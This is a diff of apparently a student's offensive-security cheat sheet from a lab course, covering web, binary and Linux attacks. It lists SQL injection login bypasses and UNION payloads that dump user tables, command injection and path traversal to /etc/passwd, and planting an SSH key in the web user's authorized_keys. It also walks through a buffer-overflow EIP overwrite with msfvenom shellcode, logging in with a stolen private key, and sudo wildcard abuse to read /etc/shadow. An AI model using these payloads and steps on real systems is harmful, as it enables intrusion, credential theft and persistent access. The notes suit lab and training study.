@@ -50,25 +50,26 @@ python3 -m http.server
 # to exploit a webpage: 
   nmap --script=http-enum <ip>
   after nmap you type in the directories found at the search bar (fefwwsfews/img or /admin)
+  for the login, Aauth bypasss ('or1=1')  
+	then inspect and go to network
+	the click the request tab after clicking POST 
+	copy past the raw request payload after a ? and possibly but easily collect creds
 
-  then you generate your key
+  generating your key
       ssh-keygen -t rsa -b 4096
       cat  /.ssh/id_rsa.pub
       echo "your key from the cat" > /var/www/.ssh/authorized_keys
-  
+        you may need to create the .ssh directory
+            ; mkdir /var/www/.ssh
+            
   then you replace the ssh keys with your own so you dont need a password to get on the box and make sure to create the authorized_keys file in www user with and using the echo command above will place your key in it allowing free ssh usage and no password
-    ; mkdir /var/www/.ssh
-   # on a webpage in the search bar you need a ; before every command 
+   
+   # on a webpage in the search bar you need a ; before every command and if its not vulnerable to that try ../../../../../etc/passwd
 
 
 ## sql injections 
 if brought to a webpage with multiple links or with catalogues use these
-' OR 1='1’      will authenticate and bypass a login 
-# Once we got in, we opened the developer console (inspect) and found a username variable
-# Make sure to click the radio button to see information in RAW format
-# We then copied that variable added a "?" to the url because we are passing information and pasted the variable
-# After doing this we were shown usernames and passwords in that variable
-
+<thing>' OR 1='1’ 
 identify columns with <vulnerable item>' UNION SELECT 1,2,3,4,5 #
 
 <item>' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
@@ -90,7 +91,9 @@ OR 1=1
 ?Selection=3 UNION SELECT id,pass,name FROM session.user
 
 ' UNION SELECT table_schema,table_name FROM information_schema.columns
-
+## example 
+  http://127.0.0.1:12779/pick.php?product=7 UNION SELECT name,username,user_id FROM siteusers.users
+  
 ## rev engineering 
 run the exe or binary against strings with
     .\downloads\SYSINTERNALS\strings.exe .\downloads\.exe
@@ -102,13 +105,13 @@ then find the "success!" statement and work up and analyze what the code is doin
   *STEP 1 env - gdb ./.exe
   2. overload the file with a lot of characters 
   2a. once acquired the segmentation fault paste the EIP value in the buffer opverflow generator and use that as your buffer, 
-  3. show env then unset env <variable except ourself like lines and columns>
-  4. run info proc map 
-  5. run find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
+  3. show env then unset env <variable except ourself  unsetlines and columns>
+  4. run info proc map  AFTER A SEGMENTATION FAULT WHILST RUNNING  
+  5. run find /b 0xf7de1000<start>, 0xffffe000<end>, 0xff, 0xe4
   6. tale first 4 (really 1) and convert it to little endian and make that your EIP
   7. use msfvenom to generate shellcode 
         msfvenom -p /linux/x86/exec CMD=<command to execute> -b '\x00' -f python
-        msfvenom --list payloads
+        msfvenom --list payloads (not important)
       ## how to generate shell code via msfconsole
 payload/linux/x86/exec
 show options 
@@ -149,7 +152,8 @@ scp -P 2323 creds@127.0.0.1:/remote/file.txt .    #grabs a file from a remote sy
 * Bring private key to your own box
 * On your box:
   - `chmod 600 /home/student/stolenkey` # place stolen key
-  - `ssh -i /home/student/stolenkey jane@1.2.3.4`   # use the key stored in home then regular ssh syntax
+  - `ssh -i /home/student/path/.ssh jane@1.2.3.4`   # use the key stored in home then regular ssh syntax, also change the directory perms to 700 for the one .ssh is in 
+    
 cat /etc/hosts
 check /var/log/syslog
 cat /etc/crontab
@@ -161,3 +165,32 @@ for linux:
   sudo cat /etc/sudoers
 cat /etc/rsyslog.conf  
 cd to /etc/rsyslog.d then ls for newer references
+
+sudo -l
+    use gtfo bin to reference the commands that you cna exploit if any show up here
+
+sudo -l 
+  as root with NO PASSWD you can run /var/log/syslog* 
+  ls -l /var/log/syslog* shows all the log rotations (.gz logs) 
+    star means anything 
+  so because star is there, it means any character o we can do: cat /var/log/syslog /etc/shadow (or any file)
+
+if you cant run sudo -l or sudo in  general use the command  find / -type f -perm /4000 -ls 2>/dev/null
+                                                                                or 2/6000 
+ system level jobs are in /etc/crontab
+ user level jobs are in /var/spool/cron/crontabs    #crontabs here typicaly is only accesed by root 
+
+PATH=./:$PATH  makes the directory youre in a directory the system reads for commands, for example ls in that directory can be mkdir and can run a new set of commands when called in nthat directory
+echo $PATH
+
+find / -type d -perm /2 -ls 2>/dev/null # finds directories with the write permision set 
+ls -lisa /tmp      ls -latr puts the most recently written to file at the bottom
+wayss to figure out init type 
+  ls -latr /proc/1/exe
+  stat /sbin/init
+  man init
+  init --version
+  ps -p 1
+
+  sytemv is system 5
+  
